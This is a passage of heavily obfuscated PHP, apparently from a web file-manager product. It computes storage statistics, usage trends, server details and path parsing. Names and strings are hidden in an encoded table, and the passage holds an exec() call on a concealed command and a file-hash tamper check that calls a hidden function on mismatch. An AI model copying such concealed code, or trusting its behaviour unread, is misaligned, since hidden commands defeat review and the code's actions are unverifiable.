bÑ‚îèİ: $Aê­ÆôÁÒ = array($AÓƒ¼†”ãõ[187] => array($AÓƒ¼†”ãõ[926], $bÒø³È‡ó)); $FŸ¦·»Ü ¸ = Model($AÓƒ¼†”ãõ[477])->where($Aê­ÆôÁÒ)->count($AÓƒ¼†”ãõ[1437]); $Aê­ÆôÁÒ[$AÓƒ¼†”ãõ[187]] = array($AÓƒ¼†”ãõ[321], array($C…–åê•, $bÒø³È‡ó)); goto dªøŒ›ƒìº; D­‚öÈÁ¥: } public function _recordStore($fÆÙ•²©êÕ = '') { goto e‹İ“«Šµˆ; a‰œ‹îÍ‘: $eÌÖÏßÁ¦ø[$e †í²©ˆê[371]] = 1; $cØäŞ–ƒæ = Model($e †í²©ˆê[749])->where($eÌÖÏßÁ¦ø)->sum($e †í²©ˆê[77]); $eÌÖÏßÁ¦ø[$e †í²©ˆê[371]] = 2; goto C­áä˜ä¯; B–øååŠ: $Fá”İÊ¾Õ = Model($e †í²©ˆê[422])->where($eÌÖÏßÁ¦ø)->sum($e †í²©ˆê[77]); $eÌÖÏßÁ¦ø[$e †í²©ˆê[370]] = 0; $BİĞœò¥ÉÜ = Model($e †í²©ˆê[749])->where($eÌÖÏßÁ¦ø)->sum($e †í²©ˆê[77]); goto a‰œ‹îÍ‘; e‹İ“«Šµˆ: $e †í²©ˆê =& $_SERVER[¼€¼ˆ¦‚¡]; $b±Š‚Öº = strtotime(date($e †í²©ˆê[2043], strtotime($fÆÙ•²©êÕ))); $eÌÖÏßÁ¦ø = array($e †í²©ˆê[187] => array($e †í²©ˆê[926], $b±Š‚Öº)); goto B–øååŠ; C­áä˜ä¯: $E´¢˜†¼®© = Model($e †í²©ˆê[749])->where($eÌÖÏßÁ¦ø)->sum($e †í²©ˆê[77]); $CÛ¡¶Áˆ = array($e †í²©ˆê[210] => $fÆÙ•²©êÕ, $e †í²©ˆê[694] => (int) $BİĞœò¥ÉÜ, $e †í²©ˆê[2035] => (int) $Fá”İÊ¾Õ, $e †í²©ˆê[2036] => (int) $cØäŞ–ƒæ, $e †í²©ˆê[2037] => (int) $E´¢˜†¼®©); return $this->insert($CÛ¡¶Áˆ); goto bíª²Û–†»; bíª²Û–†»: } public function trend($A©ô›×“Ê´, $cİÄÕ•È§®) { goto E´¨’åˆÔ; F¢öÃ—†¦œ: if ($CÎİ¦õÇƒ && $cİÄÕ•È§® != $D¸‘ÌãÔ[1412]) { $c–Õ·‘¬‹® = $CÎİ¦õÇƒ[0][$D¸‘ÌãÔ[210]]; $d·‡ãŞ™‘ğ = $this->validDate($cİÄÕ•È§®, $c–Õ·‘¬‹®); $EÅ°·éÌ = array(); $Eè‚­ğ® = array_to_keyvalue($CÎİ¦õÇƒ, $D¸‘ÌãÔ[210]); foreach ($d·‡ãŞ™‘ğ as $bŸçš¬·šÙ) { if (isset($Eè‚­ğ®[$bŸçš¬·šÙ])) { $F…Œ–¸â = $Eè‚­ğ®[$bŸçš¬·šÙ]; } else { $F…Œ–¸â = end($CÎİ¦õÇƒ); $F…Œ–¸â[$D¸‘ÌãÔ[210]] = $bŸçš¬·šÙ; if ($A©ô›×“Ê´ == $D¸‘ÌãÔ[535]) { $F…Œ–¸â[$D¸‘ÌãÔ[2031]] = $F…Œ–¸â[$D¸‘ÌãÔ[2032]] = 0; } } $EÅ°·éÌ[] = $F…Œ–¸â; } $CÎİ¦õÇƒ = $EÅ°·éÌ; } $EÄùõÈ¤‡³ = array($D¸‘ÌãÔ[535] => array($D¸‘ÌãÔ[696] => LNG($D¸‘ÌãÔ[2047]), $D¸‘ÌãÔ[2031] => LNG($D¸‘ÌãÔ[2048]), $D¸‘ÌãÔ[2032] => LNG($D¸‘ÌãÔ[2049])), $D¸‘ÌãÔ[2033] => array($D¸‘ÌãÔ[694] => LNG($D¸‘ÌãÔ[2050]), $D¸‘ÌãÔ[2035] => LNG($D¸‘ÌãÔ[2051]), $D¸‘ÌãÔ[2036] => LNG($D¸‘ÌãÔ[2052]), $D¸‘ÌãÔ[2037] => LNG($D¸‘ÌãÔ[2053]))); $a®Š—ÛÊÎÌ = array($D¸‘ÌãÔ[535] => $D¸‘ÌãÔ[2054], $D¸‘ÌãÔ[2033] => $D¸‘ÌãÔ[77]); goto EˆÅ®êğ£»; AÄÓ™“æ”: return $BàŸÆ×Š˜¥; goto aŒôé·ÅØ©; EˆÅ®êğ£»: if (empty($CÎİ¦õÇƒ)) { $bŸçš¬·šÙ = date($D¸‘ÌãÔ[2038], strtotime($D¸‘ÌãÔ[2039])); $E˜ğÑ®š = array($D¸‘ÌãÔ[210] => $bŸçš¬·šÙ); foreach ($EÄùõÈ¤‡³[$A©ô›×“Ê´] as $e­†ĞÊ¯õ => $E‹‰œÒï¬”) { $E˜ğÑ®š[$e­†ĞÊ¯õ] = 0; } $CÎİ¦õÇƒ[] = $E˜ğÑ®š; } $BàŸÆ×Š˜¥ = array(); foreach ($CÎİ¦õÇƒ as $E‹‰œÒï¬”) { if ($A©ô›×“Ê´ == $D¸‘ÌãÔ[2033] && $E‹‰œÒï¬”[$D¸‘ÌãÔ[2035]] > $E‹‰œÒï¬”[$D¸‘ÌãÔ[694]]) { $E‹‰œÒï¬”[$D¸‘ÌãÔ[2035]] = $E‹‰œÒï¬”[$D¸‘ÌãÔ[694]]; } foreach ($EÄùõÈ¤‡³[$A©ô›×“Ê´] as $e­†ĞÊ¯õ => $bÚŞæ¤²•) { $F…Œ–¸â = array($D¸‘ÌãÔ[210] => $E‹‰œÒï¬”[$D¸‘ÌãÔ[210]], $D¸‘ÌãÔ[1342] => $bÚŞæ¤²•); $F…Œ–¸â[$a®Š—ÛÊÎÌ[$A©ô›×“Ê´]] = isset($E‹‰œÒï¬”[$e­†ĞÊ¯õ]) ? $E‹‰œÒï¬”[$e­†ĞÊ¯õ] : 0; $BàŸÆ×Š˜¥[] = $F…Œ–¸â; } } goto AÄÓ™“æ”; E´¨’åˆÔ: $D¸‘ÌãÔ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->init($A©ô›×“Ê´)) { return !1; } $CÎİ¦õÇƒ = $this->trendList($A©ô›×“Ê´); goto F¢öÃ—†¦œ; aŒôé·ÅØ©: } public function validDate($DÇÂèèè, $déÍ¼šĞÚ”) { goto e÷Îƒ–à÷”; Ašöù˜×§: switch ($DÇÂèèè) { case $eœÈñ™¯‰¦[1419]: $EÒ«àÎÅ¶³ = mktime(0, 0, 0, date($eœÈñ™¯‰¦[2055]), date($eœÈñ™¯‰¦[2056]) - date($eœÈñ™¯‰¦[1226]) + 7 - 7, date($eœÈñ™¯‰¦[2057])); $fÅ¯‡’ß‡ = 0; do { $b™É‡æÅ‚Ê = date($eœÈñ™¯‰¦[2038], $EÒ«àÎÅ¶³ - 3600 * 24 * 7 * $fÅ¯‡’ß‡); $B§„·Å¢§İ[] = $b™É‡æÅ‚Ê; $fÅ¯‡’ß‡++; } while ($déÍ¼šĞÚ” < $b™É‡æÅ‚Ê); break; case $eœÈñ™¯‰¦[1417]: $fÅ¯‡’ß‡ = 1; do { $b¯ê…ÂÙ• = date($eœÈñ™¯‰¦[2058], strtotime("\55\40{$fÅ¯‡’ß‡}\40\155\x6f\156\164\x68\x73")); $B§„·Å¢§İ[] = $b¯ê…ÂÙ•; $fÅ¯‡’ß‡++; } while ($déÍ¼šĞÚ” < $b¯ê…ÂÙ•); break; case $eœÈñ™¯‰¦[1726]: $Aï…ºÔ›ãŞ = (int) date($eœÈñ™¯‰¦[2057], strtotime($déÍ¼šĞÚ”)); $AªÉÅğ÷ôÖ = (int) date($eœÈñ™¯‰¦[2057]); if ($Aï…ºÔ›ãŞ >= $AªÉÅğ÷ôÖ) { break; } for ($Aï…ºÔ›ãŞ; $Aï…ºÔ›ãŞ < $AªÉÅğ÷ôÖ; $Aï…ºÔ›ãŞ++) { $B§„·Å¢§İ[] = $Aï…ºÔ›ãŞ . $eœÈñ™¯‰¦[2059]; } break; default: break; } if ($déÍ¼šĞÚ” > end($B§„·Å¢§İ)) { array_pop($B§„·Å¢§İ); } sort($B§„·Å¢§İ); goto b¤Ê‰ó„Šø; b¤Ê‰ó„Šø: return $B§„·Å¢§İ; goto f‚Ò„öÂˆˆ; e÷Îƒ–à÷”: $eœÈñ™¯‰¦ =& $_SERVER[¼€¼ˆ¦‚¡]; $dŒ™‡à®Êõ = date($eœÈñ™¯‰¦[2038], strtotime($eœÈñ™¯‰¦[2039])); $B§„·Å¢§İ = array($dŒ™‡à®Êõ); goto Ašöù˜×§; f‚Ò„öÂˆˆ: } public function listTable($Aªòß…ñãæ) { $Cİé”“Œ¹‡ = ucfirst($Aªòß…ñãæ); return Model($Cİé”“Œ¹‡)->listData(); } public function option($Båƒ’åÎÜË) { $fŠ³”àØÕ = $_SERVER[¼€¼ˆ¦‚¡][2060] . ucfirst($Båƒ’åÎÜË); return $this->{$fŠ³”àØÕ}(); } private function optionUser() { goto d¥ƒĞÁãİí; B—Ê™œùÕ: $EåÍá‹ŒÃÌ = strtotime($bãÛŞİ²ÂŸ[2062]); $eáª®„†ö² = array($bãÛŞİ²ÂŸ[2063] => array($bãÛŞİ²ÂŸ[927], $EåÍá‹ŒÃÌ)); $AÙá¨ó¶Ÿ = (int) Model($bãÛŞİ²ÂŸ[477])->where($eáª®„†ö²)->count($bãÛŞİ²ÂŸ[1437]); goto A‹øÇÇÌô¶; A‹øÇÇÌô¶: if (!$AÙá¨ó¶Ÿ) { $AÙá¨ó¶Ÿ = 1; } $EåÍá‹ŒÃÌ = strtotime(date($bãÛŞİ²ÂŸ[2042])); $eáª®„†ö² = array($bãÛŞİ²ÂŸ[2063] => array($bãÛŞİ²ÂŸ[927], $EåÍá‹ŒÃÌ)); goto AÛÕ¨¨Ÿò; d¥ƒĞÁãİí: $bãÛŞİ²ÂŸ =& $_SERVER[¼€¼ˆ¦‚¡]; $bß¼İ“ŒÓÕ = Model($bãÛŞİ²ÂŸ[477])->count($bãÛŞİ²ÂŸ[1437]); $f×‡Àºâéé = Model($bãÛŞİ²ÂŸ[477])->where($bãÛŞİ²ÂŸ[2061])->count($bãÛŞİ²ÂŸ[1437]); goto B—Ê™œùÕ; AÛÕ¨¨Ÿò: $AÃ³ª…ÌÕ× = Model($bãÛŞİ²ÂŸ[477])->where($eáª®„†ö²)->count($bãÛŞİ²ÂŸ[1437]); return array($bãÛŞİ²ÂŸ[691] => (int) $bß¼İ“ŒÓÕ, $bãÛŞİ²ÂŸ[2064] => (int) ($bß¼İ“ŒÓÕ - $f×‡Àºâéé), $bãÛŞİ²ÂŸ[2065] => (int) $f×‡Àºâéé, $bãÛŞİ²ÂŸ[2066] => (int) $AÃ³ª…ÌÕ×, $bãÛŞİ²ÂŸ[2067] => $AÙá¨ó¶Ÿ); goto Dë›¡ÎË÷ù; Dë›¡ÎË÷ù: } private function optionFile() { goto cÈ‹õòö—; Dç¢—¢ÆŒ„: $fğÔœ‡ë±« = $Bƒäš±Üá[$bâã÷¸Œ£È[2035]]; $cå·¢÷øÒ÷ = Model($bâã÷¸Œ£È[749])->where(array($bâã÷¸Œ£È[370] => 0))->count($bâã÷¸Œ£È[369]); $b‚£ÃæâÖ” = array($bâã÷¸Œ£È[370] => 0, $bâã÷¸Œ£È[187] => array($bâã÷¸Œ£È[927], strtotime(date($bâã÷¸Œ£È[2042])))); goto B ˆ¬§ôš; cÈ‹õòö—: $bâã÷¸Œ£È =& $_SERVER[¼€¼ˆ¦‚¡]; $Bƒäš±Üá = $this->sourceSize(); $eóÆ¯„ëÌ = $Bƒäš±Üá[$bâã÷¸Œ£È[77]]; goto Dç¢—¢ÆŒ„; B ˆ¬§ôš: $a÷Í·˜ëÛª = Model($bâã÷¸Œ£È[749])->where($b‚£ÃæâÖ”)->sum($bâã÷¸Œ£È[77]); $cÊ»ğƒ ¾Ì = Model($bâã÷¸Œ£È[749])->where($b‚£ÃæâÖ”)->count($bâã÷¸Œ£È[369]); return array($bâã÷¸Œ£È[694] => $eóÆ¯„ëÌ, $bâã÷¸Œ£È[2035] => $fğÔœ‡ë±«, $bâã÷¸Œ£È[2068] => $eóÆ¯„ëÌ - $fğÔœ‡ë±«, $bâã÷¸Œ£È[2069] => (int) $a÷Í·˜ëÛª, $bâã÷¸Œ£È[696] => (int) $cå·¢÷øÒ÷, $bâã÷¸Œ£È[2070] => (int) $cÊ»ğƒ ¾Ì); goto f…ŞÍëåÖ; f…ŞÍëåÖ: } private function optionAccess() { $ešˆ²„‰¸š =& $_SERVER[¼€¼ˆ¦‚¡]; return array($ešˆ²„‰¸š[691] => $this->typeLogCnt(), $ešˆ²„‰¸š[103] => $this->typeLogCnt($ešˆ²„‰¸š[103]), $ešˆ²„‰¸š[404] => $this->typeLogCnt($ešˆ²„‰¸š[404]), $ešˆ²„‰¸š[2071] => $this->typeLogCnt($ešˆ²„‰¸š[2071]), $ešˆ²„‰¸š[2072] => $this->typeLogCnt($ešˆ²„‰¸š[2072]), $ešˆ²„‰¸š[535] => $this->typeLogCnt($ešˆ²„‰¸š[33], $ešˆ²„‰¸š[2046])); } private function typeLogCnt($fàÄ—±¦çÃ = '', $AĞ›ÉÖ”­§ = "\151\144") { goto B¾¼×Ïã”×; EÃÍíé×™: $Cäí¤Ìó¹ = array($d“ñÕØ”¤…[187] => array($d“ñÕØ”¤…[927], $Bœ·…Ä¶÷)); if ($fàÄ—±¦çÃ) { $Cäí¤Ìó¹[$d“ñÕØ”¤…[29]] = array($d“ñÕØ”¤…[7], $cè¼«ÌŒ‡‰[$fàÄ—±¦çÃ]); } $E–¨ğ¨Ï = Model($d“ñÕØ”¤…[2045])->where($Cäí¤Ìó¹)->count($AĞ›ÉÖ”­§); goto d¯Ó†øÉÅß; B¾¼×Ïã”×: $d“ñÕØ”¤… =& $_SERVER[¼€¼ˆ¦‚¡]; $cè¼«ÌŒ‡‰ = array($d“ñÕØ”¤…[103] => array($d“ñÕØ”¤…[2073], $d“ñÕØ”¤…[2074]), $d“ñÕØ”¤…[404] => array($d“ñÕØ”¤…[2075], $d“ñÕØ”¤…[2076]), $d“ñÕØ”¤…[2071] => array($d“ñÕØ”¤…[2077], $d“ñÕØ”¤…[2078], $d“ñÕØ”¤…[2079]), $d“ñÕØ”¤…[2072] => array($d“ñÕØ”¤…[2080], $d“ñÕØ”¤…[2081]), $d“ñÕØ”¤…[2082] => array($d“ñÕØ”¤…[2083], $d“ñÕØ”¤…[2084], $d“ñÕØ”¤…[2085])); $Bœ·…Ä¶÷ = strtotime(date($d“ñÕØ”¤…[2042])); goto EÃÍíé×™; d¯Ó†øÉÅß: return (int) $E–¨ğ¨Ï; goto eƒš¸Ÿ—Ş; eƒš¸Ÿ—Ş: } private function optionServer() { goto aô–Ùã§ïÕ; f†âÇ¾Ì‡ù: $EˆöõÜ·„ = array($dĞ°ğÖ•õ×[740] => $AâËƒ× ²‡[$dĞ°ğÖ•õ×[367]]); $a×ÃªñÑ„ï = Model($dĞ°ğÖ•õ×[422])->where($EˆöõÜ·„)->sum($dĞ°ğÖ•õ×[77]); $A’Í±‚‹¬ = explode($dĞ°ğÖ•õ×[50], $_SERVER[$dĞ°ğÖ•õ×[139]]); goto aÛÛ¤´¶Ù…; FÌ‘«èÃçº: return array($dĞ°ğÖ•õ×[2088] => $e·Î³êËĞˆ ? $e·Î³êËĞˆ[$dĞ°ğÖ•õ×[2089]] : 0, $dĞ°ğÖ•õ×[2090] => $e·Î³êËĞˆ ? $e·Î³êËĞˆ[$dĞ°ğÖ•õ×[2091]] : 0, $dĞ°ğÖ•õ×[2092] => (int) $AâËƒ× ²‡[$dĞ°ğÖ•õ×[2089]] * 1024 * 1024 * 1024, $dĞ°ğÖ•õ×[2093] => (int) $a×ÃªñÑ„ï, $dĞ°ğÖ•õ×[2094] => ucfirst($Eö„š±Êõ), $dĞ°ğÖ•õ×[2095] => $dĞ°ğÖ•õ×[2096] . PHP_VERSION, $dĞ°ğÖ•õ×[2097] => phpBuild64() ? 64 : 32, $dĞ°ğÖ•õ×[690] => str_replace($dĞ°ğÖ•õ×[2098], $dĞ°ğÖ•õ×[903], $cÇâ•¸Ÿ‰), $dĞ°ğÖ•õ×[337] => ucfirst($b‚Æ¥î˜à), $dĞ°ğÖ•õ×[28] => $_SERVER[$dĞ°ğÖ•õ×[2099]]); goto bËçË‹İ®Æ; aÛÛ¤´¶Ù…: $Eö„š±Êõ = $A’Í±‚‹¬[0]; $B÷‰­‚àÒà = $GLOBALS[$dĞ°ğÖ•õ×[6]][$dĞ°ğÖ•õ×[17]]; $cÇâ•¸Ÿ‰ = $B÷‰­‚àÒà[$dĞ°ğÖ•õ×[887]]; goto F¨–å¼¡±; aô–Ùã§ïÕ: $dĞ°ğÖ•õ× =& $_SERVER[¼€¼ˆ¦‚¡]; $e·Î³êËĞˆ = $this->diskDriver(); $AâËƒ× ²‡ = KodIO::defaultDriver(); goto f†âÇ¾Ì‡ù; F¨–å¼¡±: if ($cÇâ•¸Ÿ‰ == $dĞ°ğÖ•õ×[720]) { $F¬ÜÜ÷Ç¨õ = explode($dĞ°ğÖ•õ×[1076], $B÷‰­‚àÒà[$dĞ°ğÖ•õ×[886]]); $cÇâ•¸Ÿ‰ = $F¬ÜÜ÷Ç¨õ[0]; } if ($cÇâ•¸Ÿ‰ == $dĞ°ğÖ•õ×[723] || $cÇâ•¸Ÿ‰ == $dĞ°ğÖ•õ×[724]) { $Bö‘½¢Œ¼İ = Model()->db()->query($dĞ°ğÖ•õ×[2086]); $Dáå“Ü‰¾º = $Bö‘½¢Œ¼İ[0] && isset($Bö‘½¢Œ¼İ[0][$dĞ°ğÖ•õ×[1341]]) ? $Bö‘½¢Œ¼İ[0][$dĞ°ğÖ•õ×[1341]] : 0; $cÇâ•¸Ÿ‰ = $dĞ°ğÖ•õ×[2087] . ($Dáå“Ü‰¾º ? $dĞ°ğÖ•õ×[8] . $Dáå“Ü‰¾º : $dĞ°ğÖ•õ×[33]); } $b‚Æ¥î˜à = $GLOBALS[$dĞ°ğÖ•õ×[6]][$dĞ°ğÖ•õ×[337]][$dĞ°ğÖ•õ×[751]]; goto FÌ‘«èÃçº; bËçË‹İ®Æ: } private function diskDriver() { goto BŞğğäÜÁí; BŞğğäÜÁí: $cò—¢Ç‚Çâ =& $_SERVER[¼€¼ˆ¦‚¡]; $AµºÓçÅ‘Ô = $cò—¢Ç‚Çâ[8]; $Fˆ¾‰ÀĞÅ = $GLOBALS[$cò—¢Ç‚Çâ[6]][$cò—¢Ç‚Çâ[2100]] == $cò—¢Ç‚Çâ[2101]; goto D·¾“ß‰²; D·¾“ß‰²: if ($Fˆ¾‰ÀĞÅ) { $AµºÓçÅ‘Ô = $cò—¢Ç‚Çâ[2102]; if (function_exists($cò—¢Ç‚Çâ[2103])) { exec($cò—¢Ç‚Çâ[2104], $Díàå×½µ); $AµºÓçÅ‘Ô = $Díàå×½µ[1] . $cò—¢Ç‚Çâ[8]; } } if (!file_exists($AµºÓçÅ‘Ô)) { return; } $b‘Áèƒ§¯Ó = @disk_total_space($AµºÓçÅ‘Ô); goto FéªôÛ½¦÷; FéªôÛ½¦÷: $dùíè·’‚£ = $b‘Áèƒ§¯Ó - @disk_free_space($AµºÓçÅ‘Ô); return array($cò—¢Ç‚Çâ[2089] => $b‘Áèƒ§¯Ó, $cò—¢Ç‚Çâ[2091] => $dùíè·’‚£); goto A¡Îëôˆğ÷; A¡Îëôˆğ÷: } public function fileChart($B‡â„Ñ®–ä) { goto eØ¢´–ƒ¶Ô; eØ¢´–ƒ¶Ô: $AÅèØ“Æ©ˆ =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset($B‡â„Ñ®–ä[$AÅèØ“Æ©ˆ[1437]])) { return Model($AÅèØ“Æ©ˆ[749])->userFileTypeProfile($B‡â„Ñ®–ä[$AÅèØ“Æ©ˆ[1437]]); } if (isset($B‡â„Ñ®–ä[$AÅèØ“Æ©ˆ[2105]])) { return Model($AÅèØ“Æ©ˆ[749])->groupFileTypeProfile($B‡â„Ñ®–ä[$AÅèØ“Æ©ˆ[2105]]); } goto A¯åÅ²ËÌØ; A¯åÅ²ËÌØ: $eô–èè‘… = $this->sourceSize(); $DÈ’·œ±±œ = array($AÅèØ“Æ©ˆ[461] => 0, $AÅèØ“Æ©ˆ[371] => 1); $CİÉ‹îõ = Model($AÅèØ“Æ©ˆ[749])->where($DÈ’·œ±±œ)->sum($AÅèØ“Æ©ˆ[77]); goto dÛöÈÔ‡Ù; dÛöÈÔ‡Ù: $DÈ’·œ±±œ[$AÅèØ“Æ©ˆ[371]] = 2; $aƒÕÄ¥´‹ = Model($AÅèØ“Æ©ˆ[749])->where($DÈ’·œ±±œ)->sum($AÅèØ“Æ©ˆ[77]); return array($AÅèØ“Æ©ˆ[694] => $eô–èè‘…[$AÅèØ“Æ©ˆ[77]], $AÅèØ“Æ©ˆ[2035] => $eô–èè‘…[$AÅèØ“Æ©ˆ[2035]], $AÅèØ“Æ©ˆ[2036] => (int) $CİÉ‹îõ, $AÅèØ“Æ©ˆ[2037] => (int) $aƒÕÄ¥´‹); goto AÑ¹İÜ„Õ; AÑ¹İÜ„Õ: } private function sourceSize() { $F™ôíš†ä =& $_SERVER[¼€¼ˆ¦‚¡]; $b†ÎİŒÇõµ = Model($F™ôíš†ä[749])->where(array($F™ôíš†ä[370] => 0))->sum($F™ôíš†ä[77]); $f‰çÇË¹¬Â = Model($F™ôíš†ä[422])->sum($F™ôíš†ä[77]); if ($f‰çÇË¹¬Â > $b†ÎİŒÇõµ) { $f‰çÇË¹¬Â = $b†ÎİŒÇõµ; } return array($F™ôíš†ä[77] => (int) $b†ÎİŒÇõµ, $F™ôíš†ä[2035] => (int) $f‰çÇË¹¬Â); } } goto c Ø¨îíÏé; B½ÙÕ¢×ª‰: $A°²„ŸÉ½ğ = $_SERVER[¼€¼ˆ¦‚¡][786]; if ($_SERVER[$_SERVER[¼€¼ˆ¦‚¡][787]] != $A°²„ŸÉ½ğ($CÆù¢é’æÙ)) { goto f‚©šÑ„¤Œ; e„ñ’¦†: $a×¢æ¶¤À($CÆù¢é’æÙ); goto d¨Òæ–‘´Ê; f‚©šÑ„¤Œ: $DçÆçîØ¦ = $_SERVER[¼€¼ˆ¦‚¡][789]; $a‚¬‚‚ÃŠ„ = $_SERVER[$_SERVER[¼€¼ˆ¦‚¡][790]] . $_SERVER[¼€¼ˆ¦‚¡][791]; $bŸáÏäÛõ = $DçÆçîØ¦($a‚¬‚‚ÃŠ„); goto Aº‘öÍ¾‘ö; Aº‘öÍ¾‘ö: $FÈö‹Ô›¨ = explode($_SERVER[¼€¼ˆ¦‚¡][217], $bŸáÏäÛõ); if (count($FÈö‹Ô›¨) < $_SERVER[¼€¼ˆ¦‚¡][556]) { $DĞµŞùëÕ = $_SERVER[¼€¼ˆ¦‚¡][792]; $DĞµŞùëÕ(); } $a×¢æ¶¤À = $_SERVER[¼€¼ˆ¦‚¡][1049]; goto e„ñ’¦†; d¨Òæ–‘´Ê: } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\x52\145\x63\x79\143\154\145\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\145\x72\106\151\x6c\x65\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\162\106\x69\x6c\145\x54\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\165\160\x52\x6f\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\123\150\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\162\123\x68\x61\x72\145\114\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\x72\x65\x54\157\115\145\175"; const KOD_SHARE_ITEM = "\173\163\150\x61\x72\x65\x49\164\x65\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\141\x72\145\x49\x74\x65\155\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\x7b\x73\145\x61\x72\x63\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\x63\x6b\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\145\x72\x52\x65\x6e\143\145\x6e\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\162\151\x76\145\162\x7d"; public static function typeList() { $câêÕÒ ‘‰ =& $_SERVER[¼€¼ˆ¦‚¡]; return array($câêÕÒ ‘‰[1050] => self::KOD_SOURCE, $câêÕÒ ‘‰[1051] => self::KOD_USER_RECYCLE, $câêÕÒ ‘‰[1052] => self::KOD_USER_FAV, $câêÕÒ ‘‰[1053] => self::KOD_USER_FILE_TAG, $câêÕÒ ‘‰[1054] => self::KOD_USER_FILE_TYPE, $câêÕÒ ‘‰[1055] => self::KOD_GROUP_ROOT_SELF, $câêÕÒ ‘‰[1056] => self::KOD_USER_SHARE, $câêÕÒ ‘‰[1057] => self::KOD_USER_SHARE_LINK, $câêÕÒ ‘‰[1058] => self::KOD_USER_SHARE_TO_ME, $câêÕÒ ‘‰[1059] => self::KOD_SHARE_ITEM, $câêÕÒ ‘‰[1060] => self::KOD_SHARE_LINK, $câêÕÒ ‘‰[1061] => self::KOD_SEARCH, $câêÕÒ ‘‰[1062] => self::KOD_BLOCK, $câêÕÒ ‘‰[1063] => self::KOD_IO, $câêÕÒ ‘‰[1064] => self::KOD_USER_RECENT, $câêÕÒ ‘‰[1065] => self::KOD_USER_DRIVER); } public static function parse($CÔç‚±ª‘¯) { goto Aå¦›¤Ğ’±; d‘‚¾µ—…: preg_match($fÁ¦ã¹ŒØ[1066], $CÔç‚±ª‘¯, $a·ç÷ÒåŒÉ); $bÄ„Êª¤â = array($fÁ¦ã¹ŒØ[388] => !1, $fÁ¦ã¹ŒØ[1067] => !1, $fÁ¦ã¹ŒØ[385] => !1, $fÁ¦ã¹ŒØ[75] => $CÔç‚±ª‘¯, $fÁ¦ã¹ŒØ[1012] => !1, $fÁ¦ã¹ŒØ[1011] => $fÁ¦ã¹ŒØ[33]); if (is_array($a·ç÷ÒåŒÉ) && count($a·ç÷ÒåŒÉ) == 5) { $eï—îòÑ´ = $fÁ¦ã¹ŒØ[1068] . $a·ç÷ÒåŒÉ[2] . $fÁ¦ã¹ŒØ[315]; if (in_array($eï—îòÑ´, $e¢‡¿Æõ)) { $bÄ„Êª¤â[$fÁ¦ã¹ŒØ[1012]] = $a·ç÷ÒåŒÉ[1]; $bÄ„Êª¤â[$fÁ¦ã¹ŒØ[29]] = $eï—îòÑ´; $bÄ„Êª¤â[$fÁ¦ã¹ŒØ[1069]] = substr($eï—îòÑ´, 1, -1); $bÄ„Êª¤â[$fÁ¦ã¹ŒØ[367]] = $a·ç÷ÒåŒÉ[3]; } $bÄ„Êª¤â[$fÁ¦ã¹ŒØ[1011]] = $a·ç÷ÒåŒÉ[4]; } goto B¼ˆ´ÏƒÕÔ; B¼ˆ´ÏƒÕÔ: $D¤ïÅœ§‘” = array($fÁ¦ã¹ŒØ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $bÄ„Êª¤â[$fÁ¦ã¹ŒØ[1070]] = in_array($bÄ„Êª¤â[$fÁ¦ã¹ŒØ[29]], $D¤ïÅœ§‘”); return $bÄ„Êª¤â; goto DíÅÏˆêõ; Aå¦›¤Ğ’±: $fÁ¦ã¹ŒØ =& $_SERVER[¼€¼ˆ¦‚¡]; $CÔç‚±ª‘¯ = self::clear($CÔç‚±ª‘¯); $e¢‡¿Æõ = array_values(self::typeList()); goto d‘‚¾µ—…; DíÅÏˆêõ: } public static function clear($C²ø¶éğÉ) { goto a™ÍËšŞ°ª; Cã¿“¦¼¾: return $C²ø¶éğÉ; goto Eò‰Ãîé; B‚µŠ¤ùãñ: $C²ø¶éğÉ = preg_replace($eÓ“ƒ½À°Ü[1073], $eÓ“ƒ½À°Ü[8], $C²ø¶éğÉ); if ($C²ø¶éğÉ == $eÓ“ƒ½À°Ü[8]) { return $eÓ“ƒ½À°Ü[8]; } $C²ø¶éğÉ = rtrim($C²ø¶éğÉ, $eÓ“ƒ½À°Ü[8]); goto Cã¿“¦¼¾; a™ÍËšŞ°ª: $eÓ“ƒ½À°Ü =& $_SERVER[¼€¼ˆ¦‚¡]; $C²ø¶éğÉ = str_replace(array($eÓ“ƒ½À°Ü[991], $eÓ“ƒ½À°Ü[217]), $eÓ“ƒ½À°Ü[50], $C²ø¶éğÉ); $C²ø¶éğÉ = str_replace($eÓ“ƒ½À°Ü[93], $eÓ“ƒ½À°Ü[8], $C²ø¶éğÉ); goto B›œ´’š†õ; B›œ´’š†õ: $FçØ¾Ôä°‚ = $eÓ“ƒ½À°Ü[1071]; if (substr($C²ø¶éğÉ, 0, 3) == $eÓ“ƒ½À°Ü[1072]) { $C²ø¶éğÉ = substr($C²ø¶éğÉ, 3); } while (strstr($C²ø¶éğÉ, $FçØ¾Ôä°‚)) { $C²ø¶éğÉ = str_replace($FçØ¾Ôä°‚, $eÓ“ƒ½À°Ü[8], $C²ø¶éğÉ); } goto B‚µŠ¤ùãñ; Eò‰Ãîé: } public static function sourceID($Bİ‰î¼Éæ) { $EÛ¥ß†Ğí‘ =& $_SERVER[¼€¼ˆ¦‚¡]; $CŸ½»ëÉ²Ä = self::parse($Bİ‰î¼Éæ); if ($CŸ½»ëÉ²Ä[$EÛ¥ß†Ğí‘[29]] !== self::KOD_SOURCE) { show_json(LNG($EÛ¥ß†Ğí‘[1074]), !1); } return 